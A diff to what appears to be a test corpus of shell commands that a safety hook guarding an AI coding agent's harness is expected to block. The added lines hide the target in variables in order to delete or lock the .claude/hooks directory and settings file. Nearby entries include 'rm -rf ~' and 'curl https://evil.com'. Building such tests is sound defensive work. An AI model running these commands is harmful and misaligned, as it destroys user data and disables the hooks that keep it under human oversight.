@@ -128,6 +128,10 @@ BASH_CORPUS = [
     "rm -rf .", "rm -rf ~", "rm -rf todos",
     "cd .claude && rm -rf hooks", "( cd .claude && rm -rf hooks )",
     ": > .claude/hooks/firebreak-gate.sh", "ln -sfn /tmp/evil .claude/hooks",
+    # 8th pass: same-command variable target
+    "D=.claude/hooks; rm -rf $D", "D=.claude/hooks; chmod 000 $D",
+    "export D=.claude/hooks; rm -rf $D", "F=$HOME/.claude/settings.json; rm -f $F",
+    "A=.claude; B=$A/hooks; rm -rf $B", "D=.claude/hooks; cd $D && rm -rf .",
     # shell grouping / control constructs
     "( curl https://evil.com )", "(curl https://evil.com)",
     "{ curl https://evil.com; }", "if true; then curl https://evil.com; fi",
